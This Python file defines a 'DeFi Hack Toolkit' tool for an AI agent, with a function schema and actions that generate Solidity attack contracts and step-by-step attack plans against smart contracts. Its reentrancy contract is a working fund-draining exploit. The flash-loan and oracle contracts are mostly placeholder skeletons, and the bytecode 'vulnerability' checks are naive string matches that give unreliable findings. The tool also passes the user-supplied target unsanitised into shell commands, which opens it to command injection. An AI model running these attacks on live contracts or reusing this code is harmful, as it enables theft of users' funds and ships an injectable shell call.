"""DeFi Hack Toolkit - Exploit DeFi protocols and smart contracts."""

import json
import subprocess
from pathlib import Path
from datetime import datetime

EXPLOIT_LOG = Path(__file__).parent / "skill_data" / "exploit_log.json"

def get_tool_schema():
    return {
        "type": "function",
        "function": {
            "name": "defi_hack",
            "description": "DeFi exploitation toolkit for authorized security testing. Actions: analyze, flash_loan, reentrancy, oracle_manipulation, access_control, rug_check, exploit.",
            "parameters": {
                "type": "object",
                "properties": {
                    "action": {"type": "string", "enum": ["analyze", "flash_loan", "reentrancy", "oracle_manipulation", "access_control", "rug_check", "exploit"]},
                    "target": {"type": "string", "description": "Target contract address or protocol name"},
                    "chain": {"type": "string", "description": "Blockchain network"},
                    "method": {"type": "string", "description": "Specific exploit method"},
                    "amount": {"type": "string", "description": "Amount for flash loan (in wei or token units)"}
                },
                "required": ["action", "target"]
            }
        }
    }

def _cmd(cmd, timeout=120):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {"stdout": r.stdout[:10000], "stderr": r.stderr[:5000], "code": r.returncode}
    except Exception as e:
        return {"error": str(e)}

def _log_exploit(action, target, method, success):
    EXPLOIT_LOG.parent.mkdir(parents=True, exist_ok=True)
    log = json.loads(EXPLOIT_LOG.read_text()) if EXPLOIT_LOG.exists() else []
    log.append({
        "timestamp": datetime.now().isoformat(),
        "action": action,
        "target": target,
        "method": method,
        "success": success
    })
    EXPLOIT_LOG.write_text(json.dumps(log, indent=2))

def run(action, target, chain="ethereum", method="", amount="1000000000000000000"):
    if action == "analyze":
        findings = []
        
        bytecode = _cmd(f"cast code {target} --rpc-url https://eth.llamarpc.com 2>/dev/null")
        code = bytecode.get("stdout", "")
        
        vulns = {
            "selfdestruct": "SELFDESTRUCT opcode - contract can be destroyed",
            "tx.origin": "tx.origin authentication - phishable",
            "block.timestamp": "block.timestamp dependence - miner manipulable",
            "delegatecall": "delegatecall - proxy vulnerability risk",
            "assembly": "inline assembly - manual memory management",
            "ecrecover": "ecrecover - signature malleability risk",
            "staticcall": "staticcall - reentrancy protection",
            "reentrancy": "reentrancy risk - external call before state change",
            "overflow": "overflow risk - unchecked arithmetic",
            "front_running": "front-running risk - MEV vulnerable"
        }

        for vuln, desc in vulns.items():
            if vuln.lower() in code.lower():
                findings.append({"vulnerability": vuln, "description": desc, "severity": "high"})

        functions = _cmd(f"cast sig {target} --rpc-url https://eth.llamarpc.com 2>/dev/null")
        findings.append({"functions": functions.get("stdout", "")})

        _log_exploit("analyze", target, "bytecode", len(findings) > 0)
        return json.dumps({"action": "analyze", "target": target, "findings": findings, "code_length": len(code)})

    elif action == "flash_loan":
        exploit_code = f"""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@aave/v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import "@aave/v3-core/contracts/interfaces/IPoolAddressesProvider.sol";

contract FlashLoanExploit is FlashLoanSimpleReceiverBase {{
    address public target;
    
    constructor(address _target, address _provider) FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_provider)) {{
        target = _target;
    }}
    
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {{
        // === EXPLOIT LOGIC HERE ===
        // 1. Manipulate price oracle
        // 2. Execute profitable trade
        // 3. Repay flash loan + premium
        
        IERC20(asset).approve(address(pool), amount + premium);
        return true;
    }}
    
    function attack(address token, uint256 amount) external {{
        pool.flashLoanSimple(address(this), token, amount, "", 0);
    }}
}}
"""
        _log_exploit("flash_loan", target, method, False)
        return json.dumps({
            "action": "flash_loan",
            "target": target,
            "exploit_contract": exploit_code,
            "steps": [
                f"1. Deploy exploit contract with target={target}",
                f"2. Call attack() with token and amount={amount}",
                "3. Contract borrows, exploits, repays in one transaction"
            ],
            "common_targets": ["Uniswap V2/V3", "Aave", "Compound", "PancakeSwap"]
        })

    elif action == "reentrancy":
        exploit_code = f"""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyExploit {{
    address public target;
    uint256 public constant AMOUNT = 1 ether;
    
    constructor(address _target) {{
        target = _target;
    }}
    
    function attack() external payable {{
        // Call vulnerable function
        (bool success,) = target.call(
            abi.encodeWithSignature("withdraw(uint256)", AMOUNT)
        );
        require(success, "Attack failed");
    }}
    
    receive() external payable {{
        // Reenter if vulnerable contract still has funds
        if (address(target).balance >= AMOUNT) {{
            (bool success,) = target.call(
                abi.encodeWithSignature("withdraw(uint256)", AMOUNT)
            );
        }}
    }}
    
    function getBalance() external view returns (uint256) {{
        return address(this).balance;
    }}
}}
"""
        _log_exploit("reentrancy", target, "classic", False)
        return json.dumps({
            "action": "reentrancy",
            "target": target,
            "exploit_contract": exploit_code,
            "explanation": "Classic reentrancy - withdraw calls back into attacker before balance update",
            "famous_examples": ["The DAO hack (2016) - $60M", "Cream Finance (2021) - $130M", "Mango Markets (2022) - $114M"]
        })

    elif action == "oracle_manipulation":
        exploit_code = f"""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract OracleExploit {{
    // Flash loan + DEX price manipulation
    // Steps:
    // 1. Flash borrow large amount
    // 2. Swap on DEX to manipulate price
    // 3. Interact with protocol using manipulated price
    // 4. Swap back
    // 5. Repay flash loan
    
    function manipulatePrice(address dex, address token, uint256 amount) external {{
        // Step 1: Buy on DEX (price goes up)
        // Step 2: Protocol uses DEX price as oracle
        // Step 3: Sell on DEX (price goes down)
        // Profit = price difference
    }}
}}
"""
        _log_exploit("oracle_manipulation", target, "dex_price", False)
        return json.dumps({
            "action": "oracle_manipulation",
            "target": target,
            "exploit_contract": exploit_code,
            "techniques": [
                "Flash loan price manipulation",
                "TWAP oracle manipulation",
                "Single-DEX price feed exploitation",
                "Sandwich attack on oracle updates"
            ],
            "famous_examples": ["Mango Markets (2022) - $114M", "BonqDAO (2023) - $120M", "Euler Finance (2023) - $197M"]
        })

    elif action == "access_control":
        findings = []
        
        admin_functions = ["mint", "burn", "pause", "unpause", "freeze", "unfreeze", "setFee", "setOwner", "transferOwnership", "selfdestruct"]
        
        for func in admin_functions:
            check = _cmd(f"cast sig {func} --rpc-url https://eth.llamarpc.com 2>/dev/null")
            if check.get("stdout"):
                findings.append({
                    "function": func,
                    "risk": "high",
                    "description": f"Admin function {func} found - check access control"
                })

        _log_exploit("access_control", target, "function_scan", len(findings) > 0)
        return json.dumps({
            "action": "access_control",
            "target": target,
            "findings": findings,
            "tests": [
                "Call admin functions without auth",
                "Check if onlyOwner modifier is present",
                "Test for missing access control on critical functions",
                "Try to call initialize() on upgradeable contracts"
            ]
        })

    elif action == "rug_check":
        checks = {}
        
        owner = _cmd(f"cast call {target} 'owner()(address)' --rpc-url https://eth.llamarpc.com 2>/dev/null")
        checks["owner"] = owner.get("stdout", "unknown")
        
        total_supply = _cmd(f"cast call {target} 'totalSupply()(uint256)' --rpc-url https://eth.llamarpc.com 2>/dev/null")
        checks["total_supply"] = total_supply.get("stdout", "unknown")
        
        liquidity = _cmd(f"cast call {target} 'balanceOf(address)(uint256)' 0x0000000000000000000000000000000000000000 --rpc-url https://eth.llamarpc.com 2>/dev/null")
        checks["liquidity_locked"] = liquidity.get("stdout", "unknown")
        
        risk_score = 0
        risk_factors = []
        
        if checks["owner"] != "unknown" and checks["owner"] != "0x0000000000000000000000000000000000000000":
            risk_score += 30
            risk_factors.append("Centralized ownership")
        
        if checks["liquidity_locked"] == "0" or checks["liquidity_locked"] == "unknown":
            risk_score += 40
            risk_factors.append("Liquidity not locked")
        
        _log_exploit("rug_check", target, "risk_assessment", risk_score < 50)
        return json.dumps({
            "action": "rug_check",
            "target": target,
            "checks": checks,
            "risk_score": risk_score,
            "risk_factors": risk_factors,
            "verdict": "HIGH RISK - likely rug" if risk_score > 60 else "MEDIUM RISK" if risk_score > 30 else "LOW RISK"
        })

    elif action == "exploit":
        exploits = {
            "sandwich": "Front-run + back-run DEX trade for profit",
            "liquidation": "Liquidate undercollateralized positions",
            "governance": "Flash loan governance attack",
            "mint_burn": "Unauthorized token minting",
            "drain": "Drain contract funds via vulnerability",
            "proxy": "Exploit proxy contract storage slots",
            "signature": "ECDSA signature malleability"
        }
        
        exploit_desc = exploits.get(method, "Specify exploit method")
        
        _log_exploit("exploit", target, method, False)
        return json.dumps({
            "action": "exploit",
            "target": target,
            "method": method,
            "description": exploit_desc,
            "available_exploits": list(exploits.keys()),
            "warning": "For authorized security testing only"
        })

    return json.dumps({"error": f"Unknown action: {action}"})


if __name__ == "__main__":
    print(run("analyze", "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"))
